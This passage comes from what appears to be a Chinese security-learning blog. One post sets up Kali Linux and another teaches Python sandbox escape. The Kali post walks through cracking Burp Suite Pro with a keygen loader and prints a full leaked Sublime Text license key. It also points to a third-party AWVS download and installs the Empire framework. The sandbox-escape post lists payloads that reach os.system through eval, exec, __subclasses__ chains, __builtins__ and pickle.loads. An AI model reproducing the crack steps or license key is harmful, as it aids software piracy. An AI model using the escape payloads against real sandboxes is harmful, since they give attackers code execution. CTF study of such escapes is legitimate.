<p> <code>sudo tar -zxvf jdk-8u202-linux-x64.tar.gz</code></p>
</li>
<li><p>设置环境变量</p>
<p>  <code>sudo mousepad ~/.bashrc</code></p>
<p> 最下面加上</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#JAVA</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/jdk1.8.0_202</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin/:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<p> <img src="/2020/04/kali安装与配置/image-20200422174554381.png" alt="image-20200422174554381"></p>
</li>
<li><p>修改/etc/profile</p>
<p> <code>sudo mousepad /etc/profile</code></p>
<p> 添加</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加载.bashrc文件</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -f .bashrc ; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">source</span> .bashrc </span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p> 避免每次进shell都要更新配置文件</p>
<p> <img src="/2020/04/kali安装与配置/image-20200422175335303.png" alt="image-20200422175335303"></p>
</li>
<li><p>安装并注册</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_202/bin/java 1</span><br><span class="line"></span><br><span class="line">sudo update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_202/bin/javac 1</span><br><span class="line"></span><br><span class="line">sudo update-alternatives --<span class="built_in">set</span> java /opt/jdk1.8.0_202/bin/java</span><br><span class="line"></span><br><span class="line">sudo update-alternatives --<span class="built_in">set</span> javac /opt/jdk1.8.0_202/bin/javac</span><br></pre></td></tr></table></figure>

<p> <img src="/2020/04/kali安装与配置/image-20200422175852100.png" alt="image-20200422175852100"></p>
</li>
<li><p>破解burpsuit</p>
<p><code>sudo mkdir /opt/burpsuit</code></p>
<p><code>sudo mv burp-loader-keygen-2020_1.jar burpsuite_pro_v2020.1.jar /opt/burpsuit/</code></p>
</li>
</ol>
<p><img src="/2020/04/kali安装与配置/image-20200422183206266.png" alt="image-20200422183206266"></p>
<p><img src="/2020/04/kali安装与配置/image-20200422193327897.png" alt="image-20200422193327897"></p>
<p>运行加载器后，正常破解即可</p>
<p>7.创建快捷方式</p>
<p><code>sudo rm -rf /usr/bin/burpsuite</code> </p>
<p> <code>sudo touch /usr/bin/burpsuite</code></p>
<p> <code>sudo mousepad /usr/bin/burpsuite</code></p>
<p>添加以下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> /opt/burpsuit &amp;&amp; java -noverify -Xbootclasspath/p:burp-loader-keygen-2020_1.jar -jar burpsuite_pro_v2020.1.jar</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/kali安装与配置/image-20200422194026070.png" alt></p>
<p>增加执行权限</p>
<p><code>sudo chmod +x /usr/bin/burpsuite</code></p>
<p>修改快捷方式</p>
<p><code>sudo mousepad /usr/share/applications/kali-burpsuite.desktop</code> </p>
<p><img src="/2020/04/kali安装与配置/image-20200422194502658.png" alt="image-20200422194502658"></p>
<p>把<code>Exec=sh -c &quot;java -jar /usr/bin/burpsuite</code>改为<code>Exec=sh -c &quot;/usr/bin/burpsuite</code></p>
<p>然后命令行和图标都能运行了</p>
<h3 id="3-安装Subline-text3"><a href="#3-安装Subline-text3" class="headerlink" title="3.安装Subline text3"></a>3.安装Subline text3</h3><ol>
<li><p>安装GPG</p>
<p> <code>wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -</code></p>
<p> <img src="/2020/04/kali安装与配置/image-20200422195424105.png" alt="image-20200422195424105"></p>
</li>
<li><p>确保apt被设置为https源</p>
<p>  <code>sudo apt-get install apt-transport-https</code></p>
</li>
</ol>
<p>​    </p>
<ol start="3">
<li><p>选择稳定版本</p>
<p><code>echo &quot;deb https://download.sublimetext.com/ apt/stable/&quot; | sudo tee /etc/apt/sources.list.d/sublime-text.list</code></p>
</li>
<li><p>安装sublime-text3</p>
<p> <code>sudo apt-get update</code></p>
<p> <code>sudo apt-get install sublime-text</code></p>
<p> 可能会很慢，建议代理</p>
</li>
<li><p>汉化sublime</p>
<p>按ctrl+shift+p,调出隐藏窗口,先安装包控制<br><img src="/2020/04/kali安装与配置/image-20200422201255164.png" alt="image-20200422201255164"></p>
<p>Perferences-&gt;Package Control-&gt;install Package<br><img src="/2020/04/kali安装与配置/image-20200422201619067.png" alt="image-20200422201619067"></p>
<p>之后输入 Localizations 安装对应插件 回车确认 即可实现汉化</p>
</li>
<li><p>安装SublimeREPL 同理</p>
<p> 配置python3环境</p>
<p> <code>vim .config/sublime-text-3/Packages/SublimeREPL/config/Python/Main.sublime-menu</code></p>
<p> 把cmd 开头的字符串中的python改成python3</p>
<p> <img src="/2020/04/kali安装与配置/image-20200507210324333.png" alt="image-20200507210324333"></p>
</li>
<li><p>安装anaconda</p>
<p> 配置anaconda, 首选项-&gt;Package Settings -&gt; Anaconda -&gt;Settings -User</p>
<p> 粘贴以下内容</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;    </span><br><span class="line"><span class="attr">"anaconda_linting"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">"python_interpreter"</span>: <span class="string">"/usr/bin/python3.7"</span>,</span><br><span class="line"><span class="attr">"suppress_explicit_completions"</span>:<span class="literal">true</span>,</span><br><span class="line"><span class="attr">"suppress_word_completion"</span>:<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 设置快捷键 ，首选项-&gt;快捷键设置 在user这栏填上</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="attr">"keys"</span>: [<span class="string">"f5"</span>],</span><br><span class="line">    <span class="attr">"caption"</span>: <span class="string">"SublimeREPL: Python - RUN current file"</span>,</span><br><span class="line">    <span class="attr">"command"</span>: <span class="string">"run_existing_window_command"</span>,</span><br><span class="line">    <span class="attr">"args"</span>: &#123;</span><br><span class="line">        <span class="attr">"id"</span>: <span class="string">"repl_python_run"</span>,</span><br><span class="line">        <span class="attr">"file"</span>: <span class="string">"config/Python/Main.sublime-menu"</span>&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="attr">"keys"</span>: [<span class="string">"ctrl+f5"</span>],</span><br><span class="line">    <span class="attr">"caption"</span>: <span class="string">"SublimeREPL: Python - PDB current file"</span>,</span><br><span class="line">    <span class="attr">"command"</span>: <span class="string">"run_existing_window_command"</span>,</span><br><span class="line">    <span class="attr">"args"</span>: &#123;</span><br><span class="line">        <span class="attr">"id"</span>: <span class="string">"repl_python_pdb"</span>,</span><br><span class="line">        <span class="attr">"file"</span>: <span class="string">"config/Python/Main.sublime-menu"</span>&#125;</span><br><span class="line">    &#125;,   </span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p> f5运行python  ctrl+f5 pdb调试python</p>
</li>
<li><p>注册码</p>
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">----- BEGIN LICENSE -----</span><br><span class="line">Member J2TeaM</span><br><span class="line">Single User License</span><br><span class="line">EA7E<span class="number">-1011316</span></span><br><span class="line">D7DA350E <span class="number">1</span>B8B0760 <span class="number">972</span>F8B60 F3E64036</span><br><span class="line">B9B4E234 F356F38F <span class="number">0</span>AD1E3B7 <span class="number">0E9</span>C5FAD</span><br><span class="line">FA0A2ABE <span class="number">25</span>F65BD8 D51458E5 <span class="number">3923</span>CE80</span><br><span class="line"><span class="number">87428428</span> <span class="number">79079</span>A01 AA69F319 A1AF29A4</span><br><span class="line">A684C2DC <span class="number">0</span>B1583D4 <span class="number">19</span>CBD290 <span class="number">217618</span>CD</span><br><span class="line"><span class="number">5653E0</span>A0 BACE3948 BB2EE45E <span class="number">422</span>D2C87</span><br><span class="line">DD9AF44B <span class="number">99</span>C49590 D2DBDEE1 <span class="number">75860</span>FD2</span><br><span class="line"><span class="number">8</span>C8BB2AD B2ECE5A4 EFC08AF2 <span class="number">25</span>A9B864</span><br><span class="line">------ END LICENSE ------</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="4-安装AWVS13"><a href="#4-安装AWVS13" class="headerlink" title="4.安装AWVS13"></a>4.安装AWVS13</h3><pre><code>awvs安装包下载 `http://0verflow.cn/?p=1463`</code></pre><p><img src="/2020/04/kali安装与配置/image-20200422221053236.png" alt="image-20200422221053236"></p>
<p><img src="/2020/04/kali安装与配置/image-20200422221147845.png" alt="image-20200422221147845"></p>
<p><img src="/2020/04/kali安装与配置/image-20200422221208598.png" alt="image-20200422221208598"></p>
<h3 id="5-安装nessus"><a href="#5-安装nessus" class="headerlink" title="5.安装nessus"></a>5.安装nessus</h3><p><a href="https://www.tenable.com/downloads/nessus?loginAttempted=true" target="_blank" rel="noopener">Nessus官网</a>下载对于版本的安装包</p>
<p><img src="/2020/04/kali安装与配置/image-20200422230607599.png" alt="image-20200422230607599"></p>
<p><img src="/2020/04/kali安装与配置/image-20200422230308965.png" alt="image-20200422230308965"></p>
<p><img src="/2020/04/kali安装与配置/image-20200422230627297.png" alt="image-20200422230627297"></p>
<p>接下来账号密码随意，记得就行</p>
<p>进入这个页面后</p>
<p><img src="/2020/04/kali安装与配置/image-20200422230745749.png" alt="image-20200422230745749"></p>
<p><img src="/2020/04/kali安装与配置/image-20200422231111879.png" alt="image-20200422231111879"></p>
<p>得到challenge code</p>
<p>然后去<a href="https://zh-cn.tenable.com/products/nessus/nessus-essentials?tns_redirect=true" target="_blank" rel="noopener">官网注册</a>一个账号，邮箱必须是有效的 得到activation code </p>
<p>到<code>https://plugins.nessus.org/offline.php</code>提交它们，下载插件包</p>
<p><img src="/2020/04/kali安装与配置/image-20200422235202520.png" alt="image-20200422235202520"></p>
<p><img src="/2020/04/kali安装与配置/image-20200423001848981.png" alt="image-20200423001848981"></p>
<p><img src="/2020/04/kali安装与配置/image-20200423001748972.png" alt="image-20200423001748972"></p>
<p>将plugin_feed_info.inc文件替换到<code>/opt/nessus/var/nessus/</code>目录 和<code>/opt/nessus/lib/nessus/plugins/</code>目录</p>
<p><img src="/2020/04/kali安装与配置/image-20200423002118121.png" alt="image-20200423002118121"></p>
<h3 id="6-安装pip"><a href="#6-安装pip" class="headerlink" title="6.安装pip"></a>6.安装pip</h3><ol>
<li><p>pip2</p>
<p> <code>curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py</code></p>
<p> <code>sudo python2 get-pip.py</code></p>
</li>
<li><p>pip3</p>
<p> <code>sudo apt-get install python3-pip</code></p>
</li>
</ol>
<h3 id="7-安装Empire"><a href="#7-安装Empire" class="headerlink" title="7.安装Empire"></a>7.安装Empire</h3><p>1.下载Empire</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains git <span class="built_in">clone</span> https://github.com/EmpireProject/Empire.git</span><br></pre></td></tr></table></figure>

<p>2.更新&amp;&amp;安装依赖</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get install make \</span><br><span class="line">g++ \ </span><br><span class="line">python-dev \</span><br><span class="line">swig python-pip \</span><br><span class="line">libxml2-dev \</span><br><span class="line">default-jdk \</span><br><span class="line">libssl1.0.2 \</span><br><span class="line">libssl-dev \</span><br><span class="line">build-essential</span><br><span class="line"><span class="built_in">cd</span> /Empire/setup</span><br><span class="line">sudo pip2 install -r requirements.txt</span><br></pre></td></tr></table></figure>

<p>如果碰到pyinstaller安装失败就运行下面的语句</p>
<p> <code>pip2 install pyinstaller --no-use-pep517</code></p>
<p><img src="/2020/04/kali安装与配置/image-20200513224644533.png" alt="image-20200513224644533"></p>
<p>再来一遍 <code>sudo pip2 install -r requirements.txt</code></p>
<p>3.编译安装M2Crypto包</p>
<p>直接用脚本是装不上的，也不知道为啥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains git <span class="built_in">clone</span> https://github.com/mcepl/M2Crypto</span><br><span class="line"><span class="built_in">cd</span> M2Crypto</span><br><span class="line">sudo python setup.py build</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure>

<p> 4.正式安装</p>
<p><code>sudo ./start.sh</code></p>
<p>这下应该不会报错了</p>
<p>接着</p>
<p><code>sudo ./reset.sh</code></p>
<p>接着可能会报缺少什么什么包，缺啥直接装啥(加上sudo)</p>
<p>最后reset.sh 运行成功就安装成功了</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>python_web学习</title>
    <url>/2020/06/python-web%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-沙箱逃逸"><a href="#1-沙箱逃逸" class="headerlink" title="1.沙箱逃逸"></a>1.沙箱逃逸</h2><p>Python 的沙箱逃逸的最终目标就是执行系统任意命令，次一点的写文件，再次一点的读文件。测试环境是 <code>python3.8.2</code>,<code>py3.x</code>各个版本间有一些差异，但总体的方法不变。py2就不讨论了</p><ul>
<li><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a><strong>执行系统命令</strong></h4>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.system(<span class="string">"whoami"</span>)</span><br><span class="line">os.popen(<span class="string">"whoami"</span>).read()</span><br><span class="line">subprocess.run(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>) //如果 shell 设为 <span class="literal">True</span>,命令是被Bash(Sh)启动，所以支持shell语法。 如果shell=<span class="literal">False</span>的话，启动的是可执行程序本身，后面的参数不再支持shell语法。</span><br><span class="line">subprocess.Popen(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.call(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">"whoami"</span>)</span><br></pre></td></tr></table></figure>

<p>  执行系统命令只有 <code>os</code> <code>subprocess</code></p>
</li>
<li><h4 id="执行Python代码"><a href="#执行Python代码" class="headerlink" title="执行Python代码"></a><strong>执行Python代码</strong></h4>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eval(expression[, globals[, locals]]) //实参是一个字符串，以及可选的 globals 和 locals。globals 实参必须是一个字典。locals 可以是任何映射对象。</span><br><span class="line">exec(object[, globals[, locals]])  //这个函数支持动态执行 Python 代码。object 必须是字符串或者代码对象。<span class="keyword">exec</span>函数的返回值永远为<span class="literal">None</span>。</span><br><span class="line">f-string</span><br></pre></td></tr></table></figure>

  <figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">exec('import os <span class="comment">;os.system("whoami")')</span></span><br><span class="line">eval('__import__(<span class="string">"os"</span>).system(<span class="string">"whoami"</span>)')</span><br><span class="line">f'&#123;__import__(<span class="string">"os"</span>).system(<span class="string">"whoami"</span>)&#125;' //F'&#123;__import__(<span class="string">"os"</span>).system(<span class="string">"whoami"</span>)&#125;'</span><br></pre></td></tr></table></figure>

<p>  这两个函数是内置函数。</p>
<p>  大体上就是 <code>执行python代码 -&gt; 执行系统命令</code></p>
</li>
<li><h4 id="关键方法"><a href="#关键方法" class="headerlink" title="关键方法"></a><strong>关键方法</strong></h4></li>
</ul><a id="more"></a>

<p><code>__init__</code> 类的实例化</p>
<p><code>__base__</code> 列出其基类。<code>__base__</code> 和 <code>__bases__</code>都是返回当前类的基类，只不过<code>__bases__</code>返回的是一个元祖</p>
<p><code>__mro__</code> 递归显示其父类直到object</p>
<p><code>__subclasses__()[]</code> 获取子类</p>
<p><code>__class__</code> 获得当前对象的类</p>
<p><code>object.__getattribute__(self, name)</code> 此方法会无条件地被调用以实现对类实例属性的访问。</p>
<p><code>__globals__</code>   <code>function.__globals__</code> 等同于globals()。dir() 的结果是上面两个的键值</p>
<p><code>&#39;&#39;.__class__.__mro__[1].__subclasses__()[138].__init__.__getattribute__(&quot;__globals__&quot;)</code>  //<code>os._wrap_close</code>类</p>
<p><code>__dir__</code> 一个字典或其他类型的映射对象，用于存储对象的（可写）属性。</p>
<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__dict__[&apos;upper&apos;]
&lt;method &apos;upper&apos; of &apos;str&apos; objects&gt;
&gt;&gt;&gt; &apos;&apos;.__class__.upper
&lt;method &apos;upper&apos; of &apos;str&apos; objects&gt;</code></pre><p><code>__import__</code> <code>import</code>一个模块</p>
<p><code>bulitins</code>  Python3的内建模块，该内建模块中的功能可以直接使用，不用在其前添加内建模块前缀</p>
<pre><code>import builtins
dir(builtins) //打印所有的内联函数可获取eval exec</code></pre><p><code>__builtins__</code> <code>builtins</code> 的引用 <code>__builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)</code></p>
<p><code>__name__</code> 个值获得的只是一个字符串，不是模块的引用，使用<code>sys.modules[__name__]</code> 才获得的是模块的引用<br>        <code>__call__(self[, args...])</code> 此方法会在实例作为一个函数被“调用”时被调用；如果定义了此方法，则 <code>x(arg1, arg2, ...)</code> 就相当于 <code>x.__call__(arg1, arg2, ...)</code></p>
<p><code>().__class__.__bases__[0].__subclasses__()[37].__call__(exec,&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></p>
<p><code>dir()</code> 将显示对象的属性的名称，<code>__dict__</code>是dir()的子集。注意<a href="https://docs.python.org/zh-cn/3/library/functions.html#dir" target="_blank" rel="noopener"><code>dir()</code></a> 不会列出内置函数和变量的名称</p>
<p><code>getattr(object, name[, default])</code>  返回对象命名属性的值。<em>name</em> 必须是字符串。如果该字符串是对象的属性之一，则返回该属性的值。例如， <code>getattr(x, &#39;foobar&#39;)</code> 等同于 <code>x.foobar</code> 可以用这个特性绕过 <code>.</code> 被过滤的情况</p>
<p><code>pickle</code> 这个是python 的一个序列化的方法，用于将对象存储在字符串对象中，实现对象的持久化。</p>
<p>​     <code>pickle.loads(b&quot;cos\nsystem\n(S&#39;ls&#39;\ntR.&quot;) //执行命令</code></p>
<p><code>timeit模块</code> 测试代码的执行时间的<br>            <code>timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;,number=1)</code></p>
<p><code>importlib模块</code> </p>
<p>​    <code>find_loader</code>用来查找模块，<code>reload</code>重新载入模块<code>importlib.import_module(name, package=None)</code>充当<code>importlib.__import__()</code>的简化包装。</p>
<ul>
<li><h4 id="import-导入机制"><a href="#import-导入机制" class="headerlink" title="import 导入机制"></a>import 导入机制</h4><p>  <img src="/2020/06/python-web学习/9113969-e5945487b84c3721.png" alt="9113969-e5945487b84c3721"></p>
</li>
</ul>
<p>所以说如果导入的模块a中有着另一个模块b，那么，我们可以用a.b的方法或者<code>a.__dict__[b&lt;name&gt;]</code>的方法间接访问模块b。</p>
<p>顺着这个思路，我们可以FUZZ一下哪些模块 <code>import</code> <code>os</code>和<code>subprocess</code>从而执行系统命令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查询手册合成的标准库字典</span></span><br><span class="line"><span class="comment">#第三方库也是同样fuzz的</span></span><br><span class="line">all_modules3=[<span class="string">'string'</span>, <span class="string">'re'</span>, <span class="string">'difflib'</span>, <span class="string">'textwrap'</span>, <span class="string">'unicodedata'</span>, <span class="string">'stringprep'</span>, <span class="string">'readline'</span>, <span class="string">'rlcompleter'</span>, <span class="string">'struct'</span>, <span class="string">'codecs'</span>, <span class="string">'datetime'</span>, <span class="string">'calendar'</span>, <span class="string">'collections'</span>, <span class="string">'heapq'</span>, <span class="string">'bisect'</span>, <span class="string">'array'</span>, <span class="string">'weakref'</span>, <span class="string">'types'</span>, <span class="string">'copy'</span>, <span class="string">'pprint'</span>, <span class="string">'reprlib'</span>, <span class="string">'enum'</span>, <span class="string">'numbers'</span>, <span class="string">'math'</span>, <span class="string">'cmath'</span>, <span class="string">'decimal'</span>, <span class="string">'fractions'</span>, <span class="string">'random'</span>, <span class="string">'statistics'</span>, <span class="string">'itertools'</span>, <span class="string">'functools'</span>, <span class="string">'operator'</span>, <span class="string">'pathlib'</span>, <span class="string">'fileinput'</span>, <span class="string">'stat'</span>, <span class="string">'filecmp'</span>, <span class="string">'tempfile'</span>, <span class="string">'glob'</span>, <span class="string">'fnmatch'</span>, <span class="string">'linecache'</span>, <span class="string">'shutil'</span>, <span class="string">'pickle'</span>, <span class="string">'copyreg'</span>, <span class="string">'shelve'</span>, <span class="string">'marshal'</span>, <span class="string">'dbm'</span>, <span class="string">'sqlite3'</span>, <span class="string">'zlib'</span>, <span class="string">'gzip'</span>, <span class="string">'bz2'</span>, <span class="string">'lzma'</span>, <span class="string">'zipfile'</span>, <span class="string">'tarfile'</span>, <span class="string">'csv'</span>, <span class="string">'configparser'</span>, <span class="string">'netrc'</span>, <span class="string">'xdrlib'</span>, <span class="string">'plistlib'</span>, <span class="string">'hashlib'</span>, <span class="string">'hmac'</span>, <span class="string">'secrets'</span>, <span class="string">'os'</span>, <span class="string">'io'</span>, <span class="string">'time'</span>, <span class="string">'argparse'</span>, <span class="string">'getopt'</span>, <span class="string">'logging'</span>, <span class="string">'getpass'</span>, <span class="string">'curses'</span>, <span class="string">'platform'</span>, <span class="string">'errno'</span>, <span class="string">'ctypes'</span>, <span class="string">'threading'</span>, <span class="string">'multiprocessing'</span>, <span class="string">'concurrent'</span>, <span class="string">'subprocess'</span>, <span class="string">'sched'</span>, <span class="string">'queue'</span>, <span class="string">'_thread'</span>, <span class="string">'_dummy_thread'</span>, <span class="string">'dummy_threading'</span>, <span class="string">'contextvars'</span>, <span class="string">'asyncio'</span>, <span class="string">'socket'</span>, <span class="string">'ssl'</span>, <span class="string">'select'</span>, <span class="string">'selectors'</span>, <span class="string">'asyncore'</span>, <span class="string">'asynchat'</span>, <span class="string">'signal'</span>, <span class="string">'mmap'</span>, <span class="string">'email'</span>, <span class="string">'json'</span>, <span class="string">'mailcap'</span>, <span class="string">'mailbox'</span>, <span class="string">'mimetypes'</span>, <span class="string">'base64'</span>, <span class="string">'binhex'</span>, <span class="string">'binascii'</span>, <span class="string">'quopri'</span>, <span class="string">'uu'</span>, <span class="string">'xml'</span>, <span class="string">'webbrowser'</span>, <span class="string">'cgi'</span>, <span class="string">'cgitb'</span>, <span class="string">'wsgiref'</span>, <span class="string">'urllib'</span>, <span class="string">'http'</span>, <span class="string">'ftplib'</span>, <span class="string">'poplib'</span>, <span class="string">'imaplib'</span>, <span class="string">'nntplib'</span>, <span class="string">'smtplib'</span>, <span class="string">'smtpd'</span>, <span class="string">'telnetlib'</span>, <span class="string">'uuid'</span>, <span class="string">'socketserver'</span>, <span class="string">'xmlrpc'</span>, <span class="string">'ipaddress'</span>, <span class="string">'audioop'</span>, <span class="string">'aifc'</span>, <span class="string">'sunau'</span>, <span class="string">'wave'</span>, <span class="string">'chunk'</span>, <span class="string">'colorsys'</span>, <span class="string">'imghdr'</span>, <span class="string">'sndhdr'</span>, <span class="string">'ossaudiodev'</span>, <span class="string">'gettext'</span>, <span class="string">'locale'</span>, <span class="string">'turtle'</span>, <span class="string">'cmd'</span>, <span class="string">'shlex'</span>, <span class="string">'tkinter'</span>, <span class="string">'typing'</span>, <span class="string">'pydoc'</span>, <span class="string">'doctest'</span>, <span class="string">'unittest'</span>, <span class="string">'2to3'</span>, <span class="string">'test'</span>, <span class="string">'bdb'</span>, <span class="string">'faulthandler'</span>, <span class="string">'pdb'</span>, <span class="string">'timeit'</span>, <span class="string">'trace'</span>, <span class="string">'tracemalloc'</span>, <span class="string">'distutils'</span>, <span class="string">'ensurepip'</span>, <span class="string">'venv'</span>, <span class="string">'zipapp'</span>, <span class="string">'sys'</span>, <span class="string">'sysconfig'</span>, <span class="string">'builtins'</span>, <span class="string">'__main__'</span>, <span class="string">'warnings'</span>, <span class="string">'dataclasses'</span>, <span class="string">'contextlib'</span>, <span class="string">'abc'</span>, <span class="string">'atexit'</span>, <span class="string">'traceback'</span>, <span class="string">'__future__'</span>, <span class="string">'gc'</span>, <span class="string">'inspect'</span>, <span class="string">'site'</span>, <span class="string">'code'</span>, <span class="string">'codeop'</span>, <span class="string">'zipimport'</span>, <span class="string">'pkgutil'</span>, <span class="string">'modulefinder'</span>, <span class="string">'runpy'</span>, <span class="string">'importlib'</span>, <span class="string">'parser'</span>, <span class="string">'ast'</span>, <span class="string">'symtable'</span>, <span class="string">'symbol'</span>, <span class="string">'token'</span>, <span class="string">'keyword'</span>, <span class="string">'tokenize'</span>, <span class="string">'tabnanny'</span>, <span class="string">'pyclbr'</span>, <span class="string">'py_compile'</span>, <span class="string">'compileall'</span>, <span class="string">'dis'</span>, <span class="string">'pickletools'</span>, <span class="string">'formatter'</span>, <span class="string">'msilib'</span>, <span class="string">'msvcrt'</span>, <span class="string">'winreg'</span>, <span class="string">'winsound'</span>, <span class="string">'posix'</span>, <span class="string">'pwd'</span>, <span class="string">'spwd'</span>, <span class="string">'grp'</span>, <span class="string">'crypt'</span>, <span class="string">'termios'</span>, <span class="string">'tty'</span>, <span class="string">'pty'</span>, <span class="string">'fcntl'</span>, <span class="string">'pipes'</span>, <span class="string">'resource'</span>, <span class="string">'nis'</span>, <span class="string">'_frozen_importlib'</span>, <span class="string">'_imp'</span>, <span class="string">'_warnings'</span>, <span class="string">'_frozen_importlib_external'</span>, <span class="string">'_io'</span>, <span class="string">'nt'</span>, <span class="string">'_weakref'</span>, <span class="string">'_codecs'</span>, <span class="string">'encodings.aliases'</span>, <span class="string">'encodings'</span>, <span class="string">'encodings.utf_8'</span>, <span class="string">'_signal'</span>, <span class="string">'encodings.latin_1'</span>, <span class="string">'_abc'</span>, <span class="string">'_stat'</span>, <span class="string">'_collections_abc'</span>, <span class="string">'genericpath'</span>, <span class="string">'ntpath'</span>, <span class="string">'os.path'</span>, <span class="string">'_site'</span>]</span><br><span class="line"></span><br><span class="line">methods = [<span class="string">'os'</span>,<span class="string">'subprocess'</span>] <span class="comment"># sys __import__ __builtins__ </span></span><br><span class="line">res = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line">    res[met] = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> module <span class="keyword">in</span> all_modules3:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            m = __import__(module)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        attrs = dir(m)</span><br><span class="line">        <span class="keyword">if</span> met <span class="keyword">in</span> attrs:</span><br><span class="line">            res[met].append(module)</span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line">    print(met+<span class="string">":"</span>+str(res[met]))</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">os</span>:<span class="selector-attr">[<span class="string">'pathlib'</span>, <span class="string">'fileinput'</span>, <span class="string">'filecmp'</span>, <span class="string">'glob'</span>, <span class="string">'fnmatch'</span>, <span class="string">'linecache'</span>, <span class="string">'shutil'</span>, <span class="string">'dbm'</span>, <span class="string">'gzip'</span>, <span class="string">'bz2'</span>, <span class="string">'lzma'</span>, <span class="string">'zipfile'</span>, <span class="string">'tarfile'</span>, <span class="string">'configparser'</span>, <span class="string">'netrc'</span>, <span class="string">'plistlib'</span>, <span class="string">'secrets'</span>, <span class="string">'getopt'</span>, <span class="string">'logging'</span>, <span class="string">'getpass'</span>, <span class="string">'curses'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'socket'</span>, <span class="string">'ssl'</span>, <span class="string">'asyncore'</span>, <span class="string">'mailcap'</span>, <span class="string">'mailbox'</span>, <span class="string">'mimetypes'</span>, <span class="string">'binhex'</span>, <span class="string">'uu'</span>, <span class="string">'webbrowser'</span>, <span class="string">'cgi'</span>, <span class="string">'cgitb'</span>, <span class="string">'smtpd'</span>, <span class="string">'uuid'</span>, <span class="string">'socketserver'</span>, <span class="string">'gettext'</span>, <span class="string">'shlex'</span>, <span class="string">'pydoc'</span>, <span class="string">'doctest'</span>, <span class="string">'bdb'</span>, <span class="string">'pdb'</span>, <span class="string">'trace'</span>, <span class="string">'tracemalloc'</span>, <span class="string">'ensurepip'</span>, <span class="string">'venv'</span>, <span class="string">'zipapp'</span>, <span class="string">'sysconfig'</span>, <span class="string">'inspect'</span>, <span class="string">'site'</span>, <span class="string">'pkgutil'</span>, <span class="string">'modulefinder'</span>, <span class="string">'tabnanny'</span>, <span class="string">'py_compile'</span>, <span class="string">'compileall'</span>, <span class="string">'msilib'</span>, <span class="string">'pipes'</span>, <span class="string">'resource'</span>, <span class="string">'nis'</span>, <span class="string">'genericpath'</span>, <span class="string">'ntpath'</span>]</span></span><br><span class="line"><span class="selector-tag">subprocess</span>:<span class="selector-attr">[<span class="string">'asyncio'</span>, <span class="string">'webbrowser'</span>, <span class="string">'imaplib'</span>, <span 